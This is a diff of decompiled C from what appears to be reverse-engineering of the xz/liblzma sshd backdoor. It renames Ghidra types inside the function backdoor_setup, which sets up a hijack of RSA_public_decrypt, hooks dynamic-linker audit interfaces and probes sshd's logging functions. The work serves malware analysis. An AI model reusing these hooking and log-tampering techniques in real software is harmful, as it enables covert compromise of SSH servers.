@@ -112,7 +112,7 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   backdoor_data_zero_cursor = &loader_data;
   // AutoDoc: Wipe the stack-resident `backdoor_data_t` so every elf handle, link_map slot, and scratch struct starts from zero.
   for (loop_idx = 0x256; loop_idx != 0; loop_idx = loop_idx + -1) {
-    *(undefined4 *)&backdoor_data_zero_cursor->sshd_link_map = 0;
+    *(u32 *)&backdoor_data_zero_cursor->sshd_link_map = 0;
     backdoor_data_zero_cursor = (backdoor_data_t *)((long)&backdoor_data_zero_cursor->sshd_link_map + 4);
   }
   elf_handles = &loader_data.elf_handles;
@@ -154,8 +154,8 @@ LAB_00105951:
         loader_data.active_lzma_allocator = get_lzma_allocator();
         loop_idx = 0;
         do {
-          *(undefined1 *)((long)&loader_data.saved_lzma_allocator.alloc + loop_idx) =
-               *(undefined1 *)((long)&(loader_data.active_lzma_allocator)->alloc + loop_idx);
+          *(u8 *)((long)&loader_data.saved_lzma_allocator.alloc + loop_idx) =
+               *(u8 *)((long)&(loader_data.active_lzma_allocator)->alloc + loop_idx);
           loop_idx = loop_idx + 1;
         } while (loop_idx != 0x18);
         shared_maps_args.rsa_public_decrypt_slot = &rsa_public_decrypt_slot;
@@ -228,7 +228,7 @@ LAB_00105951:
           *params->shared_globals->global_ctx_slot = ctx;
           imported_funcs_cursor = imported_funcs;
           for (loop_idx = 0x4a; loop_idx != 0; loop_idx = loop_idx + -1) {
-            *(undefined4 *)&imported_funcs_cursor->RSA_public_decrypt_orig = 0;
+            *(u32 *)&imported_funcs_cursor->RSA_public_decrypt_orig = 0;
             imported_funcs_cursor = (imported_funcs_t *)((long)imported_funcs_cursor + (ulong)wipe_stride * -8 + 4);
           }
           (hooks_data->imported_funcs).RSA_public_decrypt_plt = rsa_public_decrypt_slot;
@@ -586,7 +586,7 @@ LAB_001065af:
     sshd_log_ctx_ptr->sshlogv_impl = loader_data.sshd_string_refs.sshlogv_format.func_start;
     decode_ctx_cursor = &syslog_dasm_ctx;
     for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
-      *(undefined4 *)&decode_ctx_cursor->instruction = 0;
+      *(u32 *)&decode_ctx_cursor->instruction = 0;
       decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + (ulong)wipe_stride * -8 + 4);
     }
     if ((u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_start != (u8 *)0x0) {
@@ -641,7 +641,7 @@ LAB_001067fb:
           log_handler_ctx_candidate = (log_handler_fn *)0x0;
           decode_ctx_cursor = &probe_dasm_ctx;
           for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
-            *(undefined4 *)&decode_ctx_cursor->instruction = 0;
+            *(u32 *)&decode_ctx_cursor->instruction = 0;
             decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + (ulong)wipe_stride * -8 + 4);
           }
           log_handler_slot_candidate = (log_handler_fn *)0x0;
@@ -680,7 +680,7 @@ LAB_001068e4:
                 log_handler_slot_tmp = (log_handler_fn *)
                            ((u8 *)(probe_dasm_ctx.mem_disp + (long)probe_dasm_ctx.instruction) +
                            CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
-                                    (undefined4)probe_dasm_ctx.instruction_size));
+                                    (u32)probe_dasm_ctx.instruction_size));
               }
               literal_scan_slot = 0;
               main_data_base = (log_handler_fn *)
@@ -698,7 +698,7 @@ LAB_00106997:
             }
             scan_cursor = probe_dasm_ctx.instruction +
                       CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
-                               (undefined4)probe_dasm_ctx.instruction_size);
+                               (u32)probe_dasm_ctx.instruction_size);
             log_handler_slot_candidate = log_handler_slot_tmp;
           }
           if ((log_handler_slot_candidate == (log_handler_fn *)0x0) || (log_handler_ctx_candidate == (log_handler_fn *)0x0)) {
@@ -764,7 +764,7 @@ LAB_00106b3c:
               (log_handler_slot_candidate < probe_dasm_ctx.instruction + (long)log_handler_tmp_ptr)) && (log_handler_tmp_ptr <= log_handler_slot_candidate)) {
             decode_ctx_cursor = &probe_dasm_ctx;
             for (loop_idx = 0x16; scan_cursor = syslog_bad_level_cursor, loop_idx != 0; loop_idx = loop_idx + -1) {
-              *(undefined4 *)&decode_ctx_cursor->instruction = 0;
+              *(u32 *)&decode_ctx_cursor->instruction = 0;
               decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + (ulong)wipe_stride * -8 + 4);
             }
             do {
@@ -779,7 +779,7 @@ LAB_00106b3c:
                   log_handler_ctx_candidate = (log_handler_fn *)
                           ((u8 *)(probe_dasm_ctx.mem_disp + (long)probe_dasm_ctx.instruction) +
                           CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
-                                   (undefined4)probe_dasm_ctx.instruction_size));
+                                   (u32)probe_dasm_ctx.instruction_size));
                 }
                 literal_scan_slot = 0;
                 log_handler_tmp_ptr = (log_handler_fn *)
@@ -790,10 +790,10 @@ LAB_00106b3c:
               }
               scan_cursor = probe_dasm_ctx.instruction +
                         CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
-                                 (undefined4)probe_dasm_ctx.instruction_size);
+                                 (u32)probe_dasm_ctx.instruction_size);
             } while (probe_dasm_ctx.instruction +
                      CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
-                              (undefined4)probe_dasm_ctx.instruction_size) <
+                              (u32)probe_dasm_ctx.instruction_size) <
                      loader_data.sshd_string_refs.syslog_bad_level.func_end);
             goto LAB_00106ab1;
           }
@@ -873,7 +873,7 @@ LAB_00106bf0:
     *(u32 *)loader_data.libcrypto_link_map = 1;
     audit_ifaces_zero_cursor = audit_ifaces_slot_ptr;
     for (loop_idx = 0x1e; loop_idx != 0; loop_idx = loop_idx + -1) {
-      *(undefined4 *)&audit_ifaces_zero_cursor->activity = 0;
+      *(u32 *)&audit_ifaces_zero_cursor->activity = 0;
       audit_ifaces_zero_cursor = (audit_ifaces *)((long)audit_ifaces_zero_cursor + (ulong)wipe_stride * -8 + 4);
     }
     (hooks_data->ldso_ctx).hooked_audit_ifaces.symbind =
@@ -883,8 +883,8 @@ LAB_00106bf0:
     loop_idx = 0;
     libc_allocator = loader_data.active_lzma_allocator;
     while (libc_allocator != (lzma_allocator *)0x0) {
-      *(undefined1 *)((long)&(loader_data.active_lzma_allocator)->alloc + loop_idx) =
-           *(undefined1 *)((long)&loader_data.saved_lzma_allocator.alloc + loop_idx);
+      *(u8 *)((long)&(loader_data.active_lzma_allocator)->alloc + loop_idx) =
+           *(u8 *)((long)&loader_data.saved_lzma_allocator.alloc + loop_idx);
       libc_allocator = (lzma_allocator *)(loop_idx + -0x17);
       loop_idx = loop_idx + 1;
     }
@@ -896,8 +896,8 @@ LAB_00105a60:
   loop_idx = 0;
   libcrypto_allocator = loader_data.active_lzma_allocator;
   while (libcrypto_allocator != (lzma_allocator *)0x0) {
-    *(undefined1 *)((long)&(loader_data.active_lzma_allocator)->alloc + loop_idx) =
-         *(undefined1 *)((long)&libc_allocator->alloc + loop_idx);
+    *(u8 *)((long)&(loader_data.active_lzma_allocator)->alloc + loop_idx) =
+         *(u8 *)((long)&libc_allocator->alloc + loop_idx);
     libcrypto_allocator = (lzma_allocator *)(loop_idx + -0x17);
     loop_idx = loop_idx + 1;
   }
@@ -911,14 +911,14 @@ LAB_00105a81:
   entry_ctx_ptr->cpuid_random_symbol_addr = (void *)0x1;
   auth_log_reloc = (int *)cpuid_basic_info(0);
   if (*auth_log_reloc != 0) {
-    cpuid_leaf_ptr = (undefined4 *)cpuid_Version_info(1);
+    cpuid_leaf_ptr = (u32 *)cpuid_Version_info(1);
     cpuid_ebx = cpuid_leaf_ptr[1];
     cpuid_ecx = cpuid_leaf_ptr[2];
     cpuid_edx = cpuid_leaf_ptr[3];
-    *(undefined4 *)&(entry_ctx_ptr->got_ctx).tls_got_entry = *cpuid_leaf_ptr;
-    *(undefined4 *)&(entry_ctx_ptr->got_ctx).cpuid_got_slot = cpuid_ebx;
-    *(undefined4 *)&(entry_ctx_ptr->got_ctx).cpuid_slot_index = cpuid_edx;
-    *(undefined4 *)&(entry_ctx_ptr->got_ctx).got_base_offset = cpuid_ecx;
+    *(u32 *)&(entry_ctx_ptr->got_ctx).tls_got_entry = *cpuid_leaf_ptr;
+    *(u32 *)&(entry_ctx_ptr->got_ctx).cpuid_got_slot = cpuid_ebx;
+    *(u32 *)&(entry_ctx_ptr->got_ctx).cpuid_slot_index = cpuid_edx;
+    *(u32 *)&(entry_ctx_ptr->got_ctx).got_base_offset = cpuid_ecx;
   }
   return FALSE;
 }
